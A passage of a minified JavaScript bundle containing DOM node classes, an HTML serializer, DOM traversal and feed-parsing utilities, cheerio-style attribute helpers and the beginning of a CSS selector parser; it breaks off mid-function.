var As=Object.defineProperty;var Ds=(e,t,a)=>t in e?As(e,t,{enumerable:!0,configurable:!0,writable:!0,value:a}):e[t]=a;var L=(e,t,a)=>Ds(e,typeof t!="symbol"?t+"":t,a);import{p as _a,q as Hs,a2 as G}from"./framework.5WXdMwYP.js";var N;(function(e){e.Root="root",e.Text="text",e.Directive="directive",e.Comment="comment",e.Script="script",e.Style="style",e.Tag="tag",e.CDATA="cdata",e.Doctype="doctype"})(N||(N={}));function js(e){return e.type===N.Tag||e.type===N.Script||e.type===N.Style}const Is=N.Root,Vs=N.Text,Us=N.Directive,Js=N.Comment,Fs=N.Script,Bs=N.Style,qs=N.Tag,zs=N.CDATA,$s=N.Doctype;class fn{constructor(){this.parent=null,this.prev=null,this.next=null,this.startIndex=null,this.endIndex=null}get parentNode(){return this.parent}set parentNode(t){this.parent=t}get previousSibling(){return this.prev}set previousSibling(t){this.prev=t}get nextSibling(){return this.next}set nextSibling(t){this.next=t}cloneNode(t=!1){return Fe(this,t)}}class Yt extends fn{constructor(t){super(),this.data=t}get nodeValue(){return this.data}set nodeValue(t){this.data=t}}class hn extends Yt{constructor(){super(...arguments),this.type=N.Text}get nodeType(){return 3}}class Gs extends Yt{constructor(){super(...arguments),this.type=N.Comment}get nodeType(){return 8}}class Xs extends Yt{constructor(t,a){super(a),this.name=t,this.type=N.Directive}get nodeType(){return 1}}class Qt extends fn{constructor(t){super(),this.children=t}get firstChild(){var t;return(t=this.children[0])!==null&&t!==void 0?t:null}get lastChild(){return this.children.length>0?this.children[this.children.length-1]:null}get childNodes(){return this.children}set childNodes(t){this.children=t}}class Ks extends Qt{constructor(){super(...arguments),this.type=N.CDATA}get nodeType(){return 4}}class un extends Qt{constructor(){super(...arguments),this.type=N.Root}get nodeType(){return 9}}class Ys extends Qt{constructor(t,a,n=[],s=t==="script"?N.Script:t==="style"?N.Style:N.Tag){super(n),this.name=t,this.attribs=a,this.type=s}get nodeType(){return 1}get tagName(){return this.name}set tagName(t){this.name=t}get attributes(){return Object.keys(this.attribs).map(t=>{var a,n;return{name:t,value:this.attribs[t],namespace:(a=this["x-attribsNamespace"])===null||a===void 0?void 0:a[t],prefix:(n=this["x-attribsPrefix"])===null||n===void 0?void 0:n[t]}})}}function v(e){return js(e)}function kt(e){return e.type===N.CDATA}function ke(e){return e.type===N.Text}function Zt(e){return e.type===N.Comment}function Qs(e){return e.type===N.Directive}function Ee(e){return e.type===N.Root}function j(e){return Object.prototype.hasOwnProperty.call(e,"children")}function Fe(e,t=!1){let a;if(ke(e))a=new hn(e.data);else if(Zt(e))a=new Gs(e.data);else if(v(e)){const n=t?At(e.children):[],s=new Ys(e.name,{...e.attribs},n);n.forEach(r=>r.parent=s),e.namespace!=null&&(s.namespace=e.namespace),e["x-attribsNamespace"]&&(s["x-attribsNamespace"]={...e["x-attribsNamespace"]}),e["x-attribsPrefix"]&&(s["x-attribsPrefix"]={...e["x-attribsPrefix"]}),a=s}else if(kt(e)){const n=t?At(e.children):[],s=new Ks(n);n.forEach(r=>r.parent=s),a=s}else if(Ee(e)){const n=t?At(e.children):[],s=new un(n);n.forEach(r=>r.parent=s),e["x-mode"]&&(s["x-mode"]=e["x-mode"]),a=s}else if(Qs(e)){const n=new Xs(e.name,e.data);e["x-name"]!=null&&(n["x-name"]=e["x-name"],n["x-publicId"]=e["x-publicId"],n["x-systemId"]=e["x-systemId"]),a=n}else throw new Error(`Not implemented yet: ${e.type}`);return a.startIndex=e.startIndex,a.endIndex=e.endIndex,e.sourceCodeLocation!=null&&(a.sourceCodeLocation=e.sourceCodeLocation),a}function At(e){const t=e.map(a=>Fe(a,!0));for(let a=1;a<t.length;a++)t[a].prev=t[a-1],t[a-1].next=t[a];return t}const Ea=/["&'<>$\x80-\uFFFF]/g,Zs=new Map([[34,"&quot;"],[38,"&amp;"],[39,"&apos;"],[60,"&lt;"],[62,"&gt;"]]),er=String.prototype.codePointAt!=null?(e,t)=>e.codePointAt(t):(e,t)=>(e.charCodeAt(t)&64512)===55296?(e.charCodeAt(t)-55296)*1024+e.charCodeAt(t+1)-56320+65536:e.charCodeAt(t);function Wn(e){let t="",a=0,n;for(;(n=Ea.exec(e))!==null;){const s=n.index,r=e.charCodeAt(s),p=Zs.get(r);p!==void 0?(t+=e.substring(a,s)+p,a=s+1):(t+=`${e.substring(a,s)}&#x${er(e,s).toString(16)};`,a=Ea.lastIndex+=+((r&64512)===55296))}return t+e.substr(a)}function gn(e,t){return function(n){let s,r=0,p="";for(;s=e.exec(n);)r!==s.index&&(p+=n.substring(r,s.index)),p+=t.get(s[0].charCodeAt(0)),r=s.index+1;return p+n.substring(r)}}const tr=gn(/["&\u00A0]/g,new Map([[34,"&quot;"],[38,"&amp;"],[160,"&nbsp;"]])),ar=gn(/[&<>\u00A0]/g,new Map([[38,"&amp;"],[60,"&lt;"],[62,"&gt;"],[160,"&nbsp;"]])),nr=new Map(["altGlyph","altGlyphDef","altGlyphItem","animateColor","animateMotion","animateTransform","clipPath","feBlend","feColorMatrix","feComponentTransfer","feComposite","feConvolveMatrix","feDiffuseLighting","feDisplacementMap","feDistantLight","feDropShadow","feFlood","feFuncA","feFuncB","feFuncG","feFuncR","feGaussianBlur","feImage","feMerge","feMergeNode","feMorphology","feOffset","fePointLight","feSpecularLighting","feSpotLight","feTile","feTurbulence","foreignObject","glyphRef","linearGradient","radialGradient","textPath"].map(e=>[e.toLowerCase(),e])),sr=new Map(["definitionURL","attributeName","attributeType","baseFrequency","baseProfile","calcMode","clipPathUnits","diffuseConstant","edgeMode","filterUnits","glyphRef","gradientTransform","gradientUnits","kernelMatrix","kernelUnitLength","keyPoints","keySplines","keyTimes","lengthAdjust","limitingConeAngle","markerHeight","markerUnits","markerWidth","maskContentUnits","maskUnits","numOctaves","pathLength","patternContentUnits","patternTransform","patternUnits","pointsAtX","pointsAtY","pointsAtZ","preserveAlpha","preserveAspectRatio","primitiveUnits","refX","refY","repeatCount","repeatDur","requiredExtensions","requiredFeatures","specularConstant","specularExponent","spreadMethod","startOffset","stdDeviation","stitchTiles","surfaceScale","systemLanguage","tableValues","targetX","targetY","textLength","viewBox","viewTarget","xChannelSelector","yChannelSelector","zoomAndPan"].map(e=>[e.toLowerCase(),e])),rr=new Set(["style","script","xmp","iframe","noembed","noframes","plaintext","noscript"]);function pr(e){return e.replace(/"/g,"&quot;")}function or(e,t){var a;if(!e)return;const n=((a=t.encodeEntities)!==null&&a!==void 0?a:t.decodeEntities)===!1?pr:t.xmlMode||t.encodeEntities!=="utf8"?Wn:tr;return Object.keys(e).map(s=>{var r,p;const o=(r=e[s])!==null&&r!==void 0?r:"";return t.xmlMode==="foreign"&&(s=(p=sr.get(s))!==null&&p!==void 0?p:s),!t.emptyAttrs&&!t.xmlMode&&o===""?s:`${s}="${n(o)}"`}).join(" ")}const Na=new Set(["area","base","basefont","br","col","command","embed","frame","hr","img","input","isindex","keygen","link","meta","param","source","track","wbr"]);function ea(e,t={}){const a="length"in e?e:[e];let n="";for(let s=0;s<a.length;s++)n+=lr(a[s],t);return n}function lr(e,t){switch(e.type){case Is:return ea(e.children,t);case $s:case Us:return xr(e);case Js:return fr(e);case zs:return wr(e);case Fs:case Bs:case qs:return ir(e,t);case Vs:return yr(e,t)}}const cr=new Set(["mi","mo","mn","ms","mtext","annotation-xml","foreignObject","desc","title"]),dr=new Set(["svg","math"]);function ir(e,t){var a;t.xmlMode==="foreign"&&(e.name=(a=nr.get(e.name))!==null&&a!==void 0?a:e.name,e.parent&&cr.has(e.parent.name)&&(t={...t,xmlMode:!1})),!t.xmlMode&&dr.has(e.name)&&(t={...t,xmlMode:"foreign"});let n=`<${e.name}`;const s=or(e.attribs,t);return s&&(n+=` ${s}`),e.children.length===0&&(t.xmlMode?t.selfClosingTags!==!1:t.selfClosingTags&&Na.has(e.name))?(t.xmlMode||(n+=" "),n+="/>"):(n+=">",e.children.length>0&&(n+=ea(e.children,t)),(t.xmlMode||!Na.has(e.name))&&(n+=`</${e.name}>`)),n}function xr(e){return`<${e.data}>`}function yr(e,t){var a;let n=e.data||"";return((a=t.encodeEntities)!==null&&a!==void 0?a:t.decodeEntities)!==!1&&!(!t.xmlMode&&e.parent&&rr.has(e.parent.name))&&(n=t.xmlMode||t.encodeEntities!=="utf8"?Wn(n):ar(n)),n}function wr(e){return`<![CDATA[${e.children[0].data}]]>`}function fr(e){return`<!--${e.data}-->`}function kn(e,t){return ea(e,t)}function hr(e,t){return j(e)?e.children.map(a=>kn(a,t)).join(""):""}function pt(e){return Array.isArray(e)?e.map(pt).join(""):v(e)?e.name==="br"?`
`:pt(e.children):kt(e)?pt(e.children):ke(e)?e.data:""}function Me(e){return Array.isArray(e)?e.map(Me).join(""):j(e)&&!Zt(e)?Me(e.children):ke(e)?e.data:""}function ot(e){return Array.isArray(e)?e.map(ot).join(""):j(e)&&(e.type===N.Tag||kt(e))?ot(e.children):ke(e)?e.data:""}function mt(e){return j(e)?e.children:[]}function mn(e){return e.parent||null}function Sn(e){const t=mn(e);if(t!=null)return mt(t);const a=[e];let{prev:n,next:s}=e;for(;n!=null;)a.unshift(n),{prev:n}=n;for(;s!=null;)a.push(s),{next:s}=s;return a}function ur(e,t){var a;return(a=e.attribs)===null||a===void 0?void 0:a[t]}function Wr(e,t){return e.attribs!=null&&Object.prototype.hasOwnProperty.call(e.attribs,t)&&e.attribs[t]!=null}function gr(e){return e.name}function ta(e){let{next:t}=e;for(;t!==null&&!v(t);)({next:t}=t);return t}function aa(e){let{prev:t}=e;for(;t!==null&&!v(t);)({prev:t}=t);return t}function Se(e){if(e.prev&&(e.prev.next=e.next),e.next&&(e.next.prev=e.prev),e.parent){const t=e.parent.children,a=t.lastIndexOf(e);a>=0&&t.splice(a,1)}e.next=null,e.prev=null,e.parent=null}function kr(e,t){const a=t.prev=e.prev;a&&(a.next=t);const n=t.next=e.next;n&&(n.prev=t);const s=t.parent=e.parent;if(s){const r=s.children;r[r.lastIndexOf(e)]=t,e.parent=null}}function mr(e,t){if(Se(t),t.next=null,t.parent=e,e.children.push(t)>1){const a=e.children[e.children.length-2];a.next=t,t.prev=a}else t.prev=null}function Sr(e,t){Se(t);const{parent:a}=e,n=e.next;if(t.next=n,t.prev=e,e.next=t,t.parent=a,n){if(n.prev=t,a){const s=a.children;s.splice(s.lastIndexOf(n),0,t)}}else a&&a.children.push(t)}function br(e,t){if(Se(t),t.parent=e,t.prev=null,e.children.unshift(t)!==1){const a=e.children[1];a.prev=t,t.next=a}else t.next=null}function Tr(e,t){Se(t);const{parent:a}=e;if(a){const n=a.children;n.splice(n.indexOf(e),0,t)}e.prev&&(e.prev.next=t),t.parent=a,t.prev=e.prev,t.next=e,e.prev=t}function Ge(e,t,a=!0,n=1/0){return na(e,Array.isArray(t)?t:[t],a,n)}function na(e,t,a,n){const s=[],r=[Array.isArray(t)?t:[t]],p=[0];for(;;){if(p[0]>=r[0].length){if(p.length===1)return s;r.shift(),p.shift();continue}const o=r[0][p[0]++];if(e(o)&&(s.push(o),--n<=0))return s;a&&j(o)&&o.children.length>0&&(p.unshift(0),r.unshift(o.children))}}function vr(e,t){return t.find(e)}function sa(e,t,a=!0){const n=Array.isArray(t)?t:[t];for(let s=0;s<n.length;s++){const r=n[s];if(v(r)&&e(r))return r;if(a&&j(r)&&r.children.length>0){const p=sa(e,r.children,!0);if(p)return p}}return null}function bn(e,t){return(Array.isArray(t)?t:[t]).some(a=>v(a)&&e(a)||j(a)&&bn(e,a.children))}function Cr(e,t){const a=[],n=[Array.isArray(t)?t:[t]],s=[0];for(;;){if(s[0]>=n[0].length){if(n.length===1)return a;n.shift(),s.shift();continue}const r=n[0][s[0]++];v(r)&&e(r)&&a.push(r),j(r)&&r.children.length>0&&(s.unshift(0),n.unshift(r.children))}}const lt={tag_name(e){return typeof e=="function"?t=>v(t)&&e(t.name):e==="*"?v:t=>v(t)&&t.name===e},tag_type(e){return typeof e=="function"?t=>e(t.type):t=>t.type===e},tag_contains(e){return typeof e=="function"?t=>ke(t)&&e(t.data):t=>ke(t)&&t.data===e}};function ra(e,t){return typeof t=="function"?a=>v(a)&&t(a.attribs[e]):a=>v(a)&&a.attribs[e]===t}function Pr(e,t){return a=>e(a)||t(a)}function Tn(e){const t=Object.keys(e).map(a=>{const n=e[a];return Object.prototype.hasOwnProperty.call(lt,a)?lt[a](n):ra(a,n)});return t.length===0?null:t.reduce(Pr)}function Rr(e,t){const a=Tn(e);return a?a(t):!0}function Mr(e,t,a,n=1/0){const s=Tn(e);return s?Ge(s,t,a,n):[]}function Or(e,t,a=!0){return Array.isArray(t)||(t=[t]),sa(ra("id",e),t,a)}function Ne(e,t,a=!0,n=1/0){return Ge(lt.tag_name(e),t,a,n)}function _r(e,t,a=!0,n=1/0){return Ge(ra("class",e),t,a,n)}function Er(e,t,a=!0,n=1/0){return Ge(lt.tag_type(e),t,a,n)}function Nr(e){let t=e.length;for(;--t>=0;){const a=e[t];if(t>0&&e.lastIndexOf(a,t-1)>=0){e.splice(t,1);continue}for(let n=a.parent;n;n=n.parent)if(e.includes(n)){e.splice(t,1);break}}return e}var te;(function(e){e[e.DISCONNECTED=1]="DISCONNECTED",e[e.PRECEDING=2]="PRECEDING",e[e.FOLLOWING=4]="FOLLOWING",e[e.CONTAINS=8]="CONTAINS",e[e.CONTAINED_BY=16]="CONTAINED_BY"})(te||(te={}));function vn(e,t){const a=[],n=[];if(e===t)return 0;let s=j(e)?e:e.parent;for(;s;)a.unshift(s),s=s.parent;for(s=j(t)?t:t.parent;s;)n.unshift(s),s=s.parent;const r=Math.min(a.length,n.length);let p=0;for(;p<r&&a[p]===n[p];)p++;if(p===0)return te.DISCONNECTED;const o=a[p-1],l=o.children,c=a[p],i=n[p];return l.indexOf(c)>l.indexOf(i)?o===t?te.FOLLOWING|te.CONTAINED_BY:te.FOLLOWING:o===e?te.PRECEDING|te.CONTAINS:te.PRECEDING}function Le(e){return e=e.filter((t,a,n)=>!n.includes(t,a+1)),e.sort((t,a)=>{const n=vn(t,a);return n&te.PRECEDING?-1:n&te.FOLLOWING?1:0}),e}function Lr(e){const t=ct(Ir,e);return t?t.name==="feed"?Ar(t):Dr(t):null}function Ar(e){var t;const a=e.children,n={type:"atom",items:Ne("entry",a).map(p=>{var o;const{children:l}=p,c={media:Cn(l)};X(c,"id","id",l),X(c,"title","title",l);const i=(o=ct("link",l))===null||o===void 0?void 0:o.attribs.href;i&&(c.link=i);const f=ie("summary",l)||ie("content",l);f&&(c.description=f);const y=ie("updated",l);return y&&(c.pubDate=new Date(y)),c})};X(n,"id","id",a),X(n,"title","title",a);const s=(t=ct("link",a))===null||t===void 0?void 0:t.attribs.href;s&&(n.link=s),X(n,"description","subtitle",a);const r=ie("updated",a);return r&&(n.updated=new Date(r)),X(n,"author","email",a,!0),n}function Dr(e){var t,a;const n=(a=(t=ct("channel",e.children))===null||t===void 0?void 0:t.children)!==null&&a!==void 0?a:[],s={type:e.name.substr(0,3),id:"",items:Ne("item",e.children).map(p=>{const{children:o}=p,l={media:Cn(o)};X(l,"id","guid",o),X(l,"title","title",o),X(l,"link","link",o),X(l,"description","description",o);const c=ie("pubDate",o)||ie("dc:date",o);return c&&(l.pubDate=new Date(c)),l})};X(s,"title","title",n),X(s,"link","link",n),X(s,"description","description",n);const r=ie("lastBuildDate",n);return r&&(s.updated=new Date(r)),X(s,"author","managingEditor",n,!0),s}const Hr=["url","type","lang"],jr=["fileSize","bitrate","framerate","samplingrate","channels","duration","height","width"];function Cn(e){return Ne("media:content",e).map(t=>{const{attribs:a}=t,n={medium:a.medium,isDefault:!!a.isDefault};for(const s of Hr)a[s]&&(n[s]=a[s]);for(const s of jr)a[s]&&(n[s]=parseInt(a[s],10));return a.expression&&(n.expression=a.expression),n})}function ct(e,t){return Ne(e,t,!0,1)[0]}function ie(e,t,a=!1){return Me(Ne(e,t,a,1)).trim()}function X(e,t,a,n,s=!1){const r=ie(a,n,s);r&&(e[t]=r)}function Ir(e){return e==="rss"||e==="feed"||e==="rdf:RDF"}const St=Object.freeze(Object.defineProperty({__proto__:null,get DocumentPosition(){return te},append:Sr,appendChild:mr,compareDocumentPosition:vn,existsOne:bn,filter:Ge,find:na,findAll:Cr,findOne:sa,findOneChild:vr,getAttributeValue:ur,getChildren:mt,getElementById:Or,getElements:Mr,getElementsByClassName:_r,getElementsByTagName:Ne,getElementsByTagType:Er,getFeed:Lr,getInnerHTML:hr,getName:gr,getOuterHTML:kn,getParent:mn,getSiblings:Sn,getText:pt,hasAttrib:Wr,hasChildren:j,innerText:ot,isCDATA:kt,isComment:Zt,isDocument:Ee,isTag:v,isText:ke,nextElementSibling:ta,prepend:Tr,prependChild:br,prevElementSibling:aa,removeElement:Se,removeSubsets:Nr,replaceElement:kr,testElement:Rr,textContent:Me,uniqueSort:Le},Symbol.toStringTag,{value:"Module"}));function dt(e){const t=e??(this?this.root():[]);let a="";for(let n=0;n<t.length;n++)a+=Me(t[n]);return a}function Vr(e,t){if(t===e)return!1;let a=t;for(;a&&a!==a.parent;)if(a=a.parent,a===e)return!0;return!1}function Ae(e){return e.cheerio!=null}function Ur(e){return e.replace(/[._-](\w|$)/g,(t,a)=>a.toUpperCase())}function Jr(e){return e.replace(/[A-Z]/g,"-$&").toLowerCase()}function H(e,t){const a=e.length;for(let n=0;n<a;n++)t(e[n],n);return e}var We;(function(e){e[e.LowerA=97]="LowerA",e[e.LowerZ=122]="LowerZ",e[e.UpperA=65]="UpperA",e[e.UpperZ=90]="UpperZ",e[e.Exclamation=33]="Exclamation"})(We||(We={}));function Fr(e){const t=e.indexOf("<");if(t<0||t>e.length-3)return!1;const a=e.charCodeAt(t+1);return(a>=We.LowerA&&a<=We.LowerZ||a>=We.UpperA&&a<=We.UpperZ||a===We.Exclamation)&&e.includes(">",t+2)}const Be=Object.prototype.hasOwnProperty,qe=/\s+/,Bt="data-",pa=/^(?:autofocus|autoplay|async|checked|controls|defer|disabled|hidden|loop|multiple|open|readonly|required|scoped|selected)$/i,Br=/^{[^]*}$|^\[[^]*]$/;function it(e,t,a){var n;if(!(!e||!v(e))){if((n=e.attribs)!==null&&n!==void 0||(e.attribs={}),!t)return e.attribs;if(Be.call(e.attribs,t))return!a&&pa.test(t)?t:e.attribs[t];if(e.name==="option"&&t==="value")return dt(e.children);if(e.name==="input"&&(e.attribs.type==="radio"||e.attribs.type==="checkbox")&&t==="value")return"on"}}function Re(e,t,a){a===null?Rn(e,t):e.attribs[t]=`${a}`}function qr(e,t){if(typeof e=="object"||t!==void 0){if(typeof t=="function"){if(typeof e!="string")throw new Error("Bad combination of arguments.");return H(this,(a,n)=>{v(a)&&Re(a,e,t.call(a,n,a.attribs[e]))})}return H(this,a=>{if(v(a))if(typeof e=="object")for(const n of Object.keys(e)){const s=e[n];Re(a,n,s)}else Re(a,e,t)})}return arguments.length>1?this:it(this[0],e,this.options.xmlMode)}function La(e,t,a){return t in e?e[t]:!a&&pa.test(t)?it(e,t,!1)!==void 0:it(e,t,a)}function Dt(e,t,a,n){t in e?e[t]=a:Re(e,t,!n&&pa.test(t)?a?"":null:`${a}`)}function zr(e,t){var a;if(typeof e=="string"&&t===void 0){const n=this[0];if(!n||!v(n))return;switch(e){case"style":{const s=this.css(),r=Object.keys(s);for(let p=0;p<r.length;p++)s[p]=r[p];return s.length=r.length,s}case"tagName":case"nodeName":return n.name.toUpperCase();case"href":case"src":{const s=(a=n.attribs)===null||a===void 0?void 0:a[e];return typeof URL<"u"&&(e==="href"&&(n.tagName==="a"||n.tagName==="link")||e==="src"&&(n.tagName==="img"||n.tagName==="iframe"||n.tagName==="audio"||n.tagName==="video"||n.tagName==="source"))&&s!==void 0&&this.options.baseURI?new URL(s,this.options.baseURI).href:s}case"innerText":return ot(n);case"textContent":return Me(n);case"outerHTML":return this.clone().wrap("<container />").parent().html();case"innerHTML":return this.html();default:return La(n,e,this.options.xmlMode)}}if(typeof e=="object"||t!==void 0){if(typeof t=="function"){if(typeof e=="object")throw new TypeError("Bad combination of arguments.");return H(this,(n,s)=>{v(n)&&Dt(n,e,t.call(n,s,La(n,e,this.options.xmlMode)),this.options.xmlMode)})}return H(this,n=>{if(v(n))if(typeof e=="object")for(const s of Object.keys(e)){const r=e[s];Dt(n,s,r,this.options.xmlMode)}else Dt(n,e,t,this.options.xmlMode)})}}function Aa(e,t,a){var n;(n=e.data)!==null&&n!==void 0||(e.data={}),typeof t=="object"?Object.assign(e.data,t):typeof t=="string"&&a!==void 0&&(e.data[t]=a)}function $r(e){for(const t of Object.keys(e.attribs)){if(!t.startsWith(Bt))continue;const a=Ur(t.slice(Bt.length));Be.call(e.data,a)||(e.data[a]=Pn(e.attribs[t]))}return e.data}function Gr(e,t){const a=Bt+Jr(t),n=e.data;if(Be.call(n,t))return n[t];if(Be.call(e.attribs,a))return n[t]=Pn(e.attribs[a])}function Pn(e){if(e==="null")return null;if(e==="true")return!0;if(e==="false")return!1;const t=Number(e);if(e===String(t))return t;if(Br.test(e))try{return JSON.parse(e)}catch{}return e}function Xr(e,t){var a;const n=this[0];if(!n||!v(n))return;const s=n;return(a=s.data)!==null&&a!==void 0||(s.data={}),e==null?$r(s):typeof e=="object"||t!==void 0?(H(this,r=>{v(r)&&(typeof e=="object"?Aa(r,e):Aa(r,e,t))}),this):Gr(s,e)}function Kr(e){const t=arguments.length===0,a=this[0];if(!a||!v(a))return t?void 0:this;switch(a.name){case"textarea":return this.text(e);case"select":{const n=this.find("option:selected");if(!t){if(this.attr("multiple")==null&&typeof e=="object")return this;this.find("option").removeAttr("selected");const s=typeof e=="object"?e:[e];for(const r of s)this.find(`option[value="${r}"]`).attr("selected","");return this}return this.attr("multiple")?n.toArray().map(s=>dt(s.children)):n.attr("value")}case"input":case"option":return t?this.attr("value"):this.attr("value",e)}}function Rn(e,t){!e.attribs||!Be.call(e.attribs,t)||delete e.attribs[t]}function xt(e){return e?e.trim().split(qe):[]}function Yr(e){const t=xt(e);for(const a of t)H(this,n=>{v(n)&&Rn(n,a)});return this}function Qr(e){return this.toArray().some(t=>{const a=v(t)&&t.attribs.class;let n=-1;if(a&&e.length>0)for(;(n=a.indexOf(e,n+1))>-1;){const s=n+e.length;if((n===0||qe.test(a[n-1]))&&(s===a.length||qe.test(a[s])))return!0}return!1})}function Mn(e){if(typeof e=="function")return H(this,(n,s)=>{if(v(n)){const r=n.attribs.class||"";Mn.call([n],e.call(n,s,r))}});if(!e||typeof e!="string")return this;const t=e.split(qe),a=this.length;for(let n=0;n<a;n++){const s=this[n];if(!v(s))continue;const r=it(s,"class",!1);if(r){let p=` ${r} `;for(const o of t){const l=`${o} `;p.includes(` ${l}`)||(p+=l)}Re(s,"class",p.trim())}else Re(s,"class",t.join(" ").trim())}return this}function On(e){if(typeof e=="function")return H(this,(s,r)=>{v(s)&&On.call([s],e.call(s,r,s.attribs.class||""))});const t=xt(e),a=t.length,n=arguments.length===0;return H(this,s=>{if(v(s))if(n)s.attribs.class="";else{const r=xt(s.attribs.class);let p=!1;for(let o=0;o<a;o++){const l=r.indexOf(t[o]);l>=0&&(r.splice(l,1),p=!0,o--)}p&&(s.attribs.class=r.join(" "))}})}function _n(e,t){if(typeof e=="function")return H(this,(p,o)=>{v(p)&&_n.call([p],e.call(p,o,p.attribs.class||"",t),t)});if(!e||typeof e!="string")return this;const a=e.split(qe),n=a.length,s=typeof t=="boolean"?t?1:-1:0,r=this.length;for(let p=0;p<r;p++){const o=this[p];if(!v(o))continue;const l=xt(o.attribs.class);for(let c=0;c<n;c++){const i=l.indexOf(a[c]);s>=0&&i<0?l.push(a[c]):s<=0&&i>=0&&l.splice(i,1)}o.attribs.class=l.join(" ")}return this}const Zr=Object.freeze(Object.defineProperty({__proto__:null,addClass:Mn,attr:qr,data:Xr,hasClass:Qr,prop:zr,removeAttr:Yr,removeClass:On,toggleClass:_n,val:Kr},Symbol.toStringTag,{value:"Module"}));var S;(function(e){e.Attribute="attribute",e.Pseudo="pseudo",e.PseudoElement="pseudo-element",e.Tag="tag",e.Universal="universal",e.Adjacent="adjacent",e.Child="child",e.Descendant="descendant",e.Parent="parent",e.Sibling="sibling",e.ColumnCombinator="column-combinator"})(S||(S={}));var U;(function(e){e.Any="any",e.Element="element",e.End="end",e.Equals="equals",e.Exists="exists",e.Hyphen="hyphen",e.Not="not",e.Start="start"})(U||(U={}));const Da=/^[^\\#]?(?:\\(?:[\da-f]{1,6}\s?|.)|[\w\-\u00b0-\uFFFF])+/,ep=/\\([\da-f]{1,6}\s?|(\s)|.)/gi,tp=new Map([[126,U.Element],[94,U.Start],[36,U.End],[42,U.Any],[33,U.Not],[124,U.Hyphen]]),ap=new Set(["has","not","matches","is","where","host","host-context"]);function Ve(e){switch(e.type){case S.Adjacent:case S.Child:case S.Descendant:case S.Parent:case S.Sibling:case S.ColumnCombinator:return!0;default:return!1}}const np=new Set(["contains","icontains"]);function sp(e,t,a){const n=parseInt(t,16)-65536;return n!==n||a?t:n<0?String.fromCharCode(n+65536):String.fromCharCode(n>>10|55296,n&1023|56320)}function He(e){return e.replace(ep,sp)}function Ht(e){return e===39||e===34}function Ha(e){return e===32||e===9||e===10||e===12||e===13}function bt(e){const t=[],a=En(t,`${e}`,0);if(a<e.length)throw new Error(`Unmatched selector: ${e.slice(a)}`);return t}function En(e,t,a){let n=[];function s(y){const u=t.slice(a+y).match(Da);if(!u)throw new Error(`Expected name, found ${t.slice(a)}`);const[g]=u;return a+=y+g.length,He(g)}function r(y){for(a+=y;a<t.length&&Ha(t.charCodeAt(a));)a++}function p(){a+=1;const y=a;let u=1;for(;u>0&&a<t.length;a++)t.charCodeAt(a)===40&&!o(a)?u++:t.charCodeAt(a)===41&&!o(a)&&u--;if(u)throw new Error("Parenthesis not matched");return He(t.slice(y,a-1))}function o(y){let u=0;for(;t.charCodeAt(--y)===92;)u++;return(u&1)===1}function l(){if(n.length>0&&Ve(n[n.length-1]))throw new Error("Did not expect successive traversals.")}function c(y){if(n.length>0&&n[n.length-1].type===S.Descendant){n[n.length-1].type=y;return}l(),n.push({type:y})}function i(y,u){n.push({type:S.Attribute,name:y,action:u,value:s(1),namespace:null,ignoreCase:"quirks"})}function f(){if(n.length&&n[n.length-1].type===S.Descendant&&n.pop(),n.length===0)throw new Error("Empty sub-selector");e.push(n)}if(r(0),t.length===a)return a;e:for(;a<t.length;){const y=t.charCodeAt(a);switch(y){case 32:case 9:case 10:case 12:case 13:{(n.length===0||n[0].type!==S.Descendant)&&(l(),n.push({type:S.Descendant})),r(1);break}case 62:{c(S.Child),r(1);break}case 60:{c(S.Parent),r(1);break}case 126:{c(S.Sibling),r(1);break}case 43:{c(S.Adjacent),r(1);break}case 46:{i("class",U.Element);break}case 35:{i("id",U.Equals);break}case 91:{r(1);let u,g=null;t.charCodeAt(a)===124?u=s(1):t.startsWith("*|",a)?(g="*",u=s(2)):(u=s(0),t.charCodeAt(a)===124&&t.charCodeAt(a+1)!==61&&(g=u,u=s(1))),r(0);let b=U.Exists;const I=tp.get(t.charCodeAt(a));if(I){if(b=I,t.charCodeAt(a+1)!==61)throw new Error("Expected `=`");r(2)}else t.charCodeAt(a)===61&&(b=U.Equals,r(1));let le="",K=null;if(b!=="exists"){if(Ht(t.charCodeAt(a))){const Q=t.charCodeAt(a);let J=a+1;for(;J<t.length&&(t.charCodeAt(J)!==Q||o(J));)J+=1;if(t.charCodeAt(J)!==Q)throw new Error("Attribute value didn't end");le=He(t.slice(a+1,J)),a=J+1}else{const Q=a;for(;a<t.length&&(!Ha(t.charCodeAt(a))&&t.charCodeAt(a)!==93||o(a));)a+=1;le=He(t.slice(Q,a))}r(0);const Y=t.charCodeAt(a)|32;Y===115?(K=!1,r(1)):Y===105&&(K=!0,r(1))}if(t.charCodeAt(a)!==93)throw new Error("Attribute selector didn't terminate");a+=1;const se={type:S.Attribute,name:u,action:b,value:le,namespace:g,ignoreCase:K};n.push(se);break}case 58:{if(t.charCodeAt(a+1)===58){n.push({type:S.PseudoElement,name:s(2).toLowerCase(),data:t.charCodeAt(a)===40?p():null});continue}const u=s(1).toLowerCase();let g=null;if(t.charCodeAt(a)===40)if(ap.has(u)){if(Ht(t.charCodeAt(a+1)))throw new Error(`Pseudo-selector ${u} cannot be quoted`);if(g=[],a=En(g,t,a+1),t.charCodeAt(a)!==41)throw new Error(`Missing closing parenthesis in :${u} (${t})`);a+=1}else{if(g=p(),np.has(u)){const b=g.charCodeAt(0);b===g.charCodeAt(g.length-1)&&Ht(b)&&(g=g.slice(1,-1))}g=He(g)}n.push({type:S.Pseudo,name:u,data:g});break}case 44:{f(),n=[],r(1);break}default:{if(t.startsWith("/*",a)){const b=t.indexOf("*/",a+2);if(b<0)throw new Error("Comment was not terminated");a=b+2,n.length===0&&r(0);break}let u=null,g;if(y===42)a+=1,g="*";else if(y===124){if(g="",t.charCodeAt(a+1)===124){c(S.ColumnCombinator),r(2);break}}else if(Da.test(t.slice(a)))g=s(0);else break e;t.charCodeAt(a)===124&&t.charCodeAt(a+1)!==124&&(u=g,t.charCodeAt(a+1)===42?(g="*",a+=2):g=s(1)),n.push(g==="*"?{type:S.Universal,namespace:u}:{type:S.Tag,name:g,namespace:u})}}}return f(),a}function Nn(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}var yt={trueFunc:function(){return!0},falseFunc:function(){return!1}};const R=Nn(yt),Ln=new Map([[S.Universal,50],[S.Tag,30],[S.Attribute,1],[S.Pseudo,0]]);function oa(e){return!Ln.has(e.type)}const rp=new Map([[U.Exists,10],[U.Equals,8],[U.Not,7],[U.Start,6],[U.End,6],[U.Any,5]]);function pp(e){const t=e.map(An);for(let a=1;a<e.length;a++){const 